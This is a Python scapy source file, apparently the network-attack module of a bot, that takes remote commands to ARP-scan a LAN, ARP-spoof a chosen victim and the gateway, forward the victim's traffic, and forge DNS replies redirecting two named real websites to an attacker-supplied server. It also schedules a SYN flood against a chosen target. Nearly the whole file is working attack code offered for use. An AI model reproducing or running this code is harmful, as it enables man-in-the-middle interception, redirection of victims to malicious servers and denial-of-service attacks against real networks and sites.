from scapy.all import*
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.l2 import ARP, Ether
import subprocess
import socket
import time
import threading
from datetime import datetime, timedelta

DIGITS = ["1","2","3","4","5","6","7","8","9","0"]


# Get the ip and subnet of the machine
def get_configs():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    my_ip = sock.getsockname()[0]
    p = subprocess.Popen('cmd /u /c ipconfig', stdout=subprocess.PIPE)
    result = p.communicate()[0]
    result = str(result).replace("\\r\\n", "")
    result = result.split("  ")

    defaultg = False

    ip = ""
    ip_line = ""
    subnet_line = ""
    default_gateway = ""

    # finds the first ip and subnet
    for line in result:
        if defaultg:
            if line.find(".") != -1:
                default_gateway = line
                defaultg = False
        if line.find("IPv4") != -1:
            ip_line = line
            ip = ip_line.split(":")[1].strip()
        elif line.find("Subnet") != -1 and my_ip == ip:
            subnet_line = line
        elif line.find("Default Gateway") != -1 and my_ip == ip:
            default_gateway = line
            default_gateway = default_gateway.split(":")[1].strip().replace("'", "")
            if len(default_gateway) < 5:
                default_gateway = ""
                defaultg = True

        if default_gateway and subnet_line:
            break

    default_gateway_ip = ""
    for c in default_gateway:
        if c in DIGITS or c == ".":
            default_gateway_ip += c

    subnet = subnet_line.split(":")[1].strip()

    subnet_number = subnet.split(".")
    sum_bin = 0
    # sums the active bits in the subnet
    for i in subnet_number:
        sum_bin += bin(int(i)).count("1")

    return ip, str(sum_bin), default_gateway_ip

# scan for active devices on the network
def scan(ip, subnet, gateway):
    # Set the network range
    target_range = ip + "/" + subnet
    # create ARP packet
    arp_layer = ARP(pdst=target_range)
    # create the Ethernet broadcast packet
    ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
    # creating the packets
    packets = ether_layer/arp_layer
    results = ""
    try_count = 0

    # srp - sends packets at layer 2 ,[0] - contains the answered packets, result is a list of [sent, received] packets
    while len(results) == 0 and try_count != 5:
        results = srp(packets, timeout=3, verbose=0)[0]
        try_count += 1

    clients = []
    my_mac = ""
    gateway_mac = ""

    if len(results) != 0:
        for sent, received in results:
            # psrc is the ip and hwsrc is the mac of the client that needs to be updated
            if received.psrc != gateway and received.psrc != ip:
                clients.append({'ip': received.psrc, 'mac': received.hwsrc})
            elif received.psrc == gateway:
                gateway_mac = received.hwsrc
            else:
                my_mac = received.hwsrc
    return clients, my_mac, gateway_mac


# finds the ip of a host
def scan_host(host):
    # Set the target ip
    target_ip = host
    # create ARP packet
    arp_layer = ARP(pdst=target_ip)
    # create the Ethernet broadcast packet
    ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
    # creating the packet
    packet = ether_layer / arp_layer
    result = ""
    host_mac = ""
    try_count = 0

    # keep sending arp packets until it receives an answer
    while len(result) == 0 and try_count != 5:
        result = srp(packet, timeout=3, verbose=0)[0]
        try_count += 1

    for sent, received in result:
        host_mac = received.hwsrc

    return host_mac


# spoofing the arp tables of the victim and the gateway
def arp_spoof(chosen_ip, gateway_ip, my_mac, victim_mac, gateway_mac, conn):
    global spoofed, finish
    end = time.time() + 3 * 60
    # attack again to remain in the middle until the victim has entered the website
    while not spoofed:
        try:
            # op 2 - is_at , sending to the victim ARP packet with my mac attached to the gateway ip
            arp_packet = ARP(op=2, pdst=chosen_ip, psrc=gateway_ip, hwsrc=my_mac, hwdst=victim_mac)
            send(arp_packet, verbose=0)
            # op 2 - is_at , sending to the default gateway ARP packet with my mac attached to the victim ip
            arp_packet = ARP(op=2, pdst=gateway_ip, psrc=chosen_ip, hwsrc=my_mac, hwdst=gateway_mac)
            send(arp_packet, verbose=0)
            time.sleep(3)
        except Exception as ex:
            conn.send(str(ex))
    time.sleep(5)   # should be 30
    # stop the ip forwarding and the spoofing
    finish = True
    conn.send("finished spoofing")
    return


# forwards the packets to their normal addresses until the victim went to the website
def packets_forwarding():
    global finish
    sniff(prn=forward, lfilter=filter_packets, store=0, stop_filter=lambda x: finish)
    return


# change the packets destination (victim->gateway, gateway->victim)
def forward(packet):
    if packet[IP].src == chosen_ip and packet[Ether].dst == my_mac:
        # check for DNS query
        if DNSQR in packet:
            packet, spoofed = change_packet(packet)
            # if the packet changed send it to victim
            if spoofed:
                packet[Ether].src = my_mac
                packet[Ether].dst = chosen_mac
            else:
                packet[Ether].src = my_mac
                packet[Ether].dst = gateway_mac
        else:
            packet[Ether].src = my_mac
            packet[Ether].dst = gateway_mac

        sock.send(packet)

    elif packet[IP].dst == chosen_ip:
        packet[Ether].src = my_mac
        packet[Ether].dst = chosen_mac
        sock.send(packet)
    return


# filter for ip packets that came from the gateway or the victim
def filter_packets(packet):
    return IP in packet and (packet[Ether].src == chosen_mac or packet[Ether].src == gateway_mac)


# changing the DNS answer for a specific domain
def change_packet(pkt):
    global spoofed
    # get the real name of the query
    real_name = pkt[DNSQR].qname.decode()[:-1]
    fake_ip = srv
    # if the victim entered the given website, change the packet
    if real_name in ["www.rabincenter.org.il", "www.sribersriber.com"]:
        spoofed = True
        # create a reply to the query with the same name but a different ip
        spoofed_pkt = Ether() / IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, qr=1,
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=50, rdata=fake_ip))
        # deletes old checksums
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[UDP].len
        del pkt[UDP].chksum
        return spoofed_pkt, spoofed
    return pkt, spoofed


# waits until the attack date is reached
def attack(time, target):
    try:
        while datetime.now() < datetime.strptime(time, "%Y-%m-%d %H:%M:%S"):
            pass
        tcp_flood(target)
    except Exception as e:
        pass


# tcp flooding an ip on port 80 to interrupt internet connections
def tcp_flood(target):
    end = time.time() + 60
    dst_port = 80
    ip_layer = IP(dst=target)
    # bulid a syn tcp packet
    tcp_layer = TCP(sport=RandShort(), dport=dst_port, flags="S")
    packet = ip_layer / tcp_layer
    while time.time() < end:
        send(packet, verbose=0)


def main_infect(conn):
    global ip, my_mac, gateway_mac, chosen_ip, chosen_mac, gateway_mac, sock, spoofed, finish
    ip, subnet, default_gate = get_configs()
    time.sleep(1)
    gateway_mac = scan_host(default_gate)
    my_mac = ARP().hwsrc
    # creating a single socket for all the packets that scapy send
    sock = conf.L2socket()
    spoofed = False
    finish = False
    while True:
        # waiting for infecting commands from the bot process
        command = conn.recv()
        if command:
            # scanning the network
            if command == "scan":
                clients, my_mac, gateway_mac = scan(ip, subnet, default_gate)

                # sends the active clients in the subnet
                conn.send(clients)

            # scanning one host
            elif command.find("scan:") != -1:
                command = command.split(":")
                chosen_ip = command[1]
                # getting the host mac
                chosen_mac = scan_host(chosen_ip)
                conn.send(chosen_mac)

            elif command.find("spoof") != -1:
                chosen_ip = conn.recv()
                chosen_mac = conn.recv()
                global srv
                srv = conn.recv()
                chosen_mac = scan_host(chosen_ip)
                if chosen_mac:
                    try:
                        # creates a spoofing thread
                        spoof_thread = threading.Thread(target=arp_spoof,
                                                            args=(chosen_ip, default_gate,
                                                                  my_mac, chosen_mac, gateway_mac,conn, ))
                        spoof_thread.start()

                        # creates a ip forwarding thread
                        forwarding_thread = threading.Thread(target=packets_forwarding)
                        forwarding_thread.start()
                    except Exception as e:
                        conn.send(str(e))
                else:
                    conn.send("Doesn't have mac")

            elif command.find("attack") != -1:
                attack_time = conn.recv()
                target = conn.recv()
                attack_thread = threading.Thread(target=attack, args=(attack_time,target,))
                attack_thread.start()
